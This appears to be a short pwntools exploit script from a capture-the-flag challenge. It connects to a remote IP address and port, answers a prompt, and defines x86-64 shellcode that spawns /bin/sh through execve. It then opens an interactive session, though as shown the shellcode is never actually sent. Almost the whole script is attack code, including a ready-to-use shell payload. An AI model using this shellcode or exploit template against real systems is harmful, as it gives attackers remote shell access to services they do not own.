from pwn import *

context.log_level = "debug"
p = remote("195.201.127.119",8664)
p.sendlineafter("today?\n",str(36))
p.recvuntil("please.\n")
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
success("len-->"+hex(len(shellcode)))
p.interactive()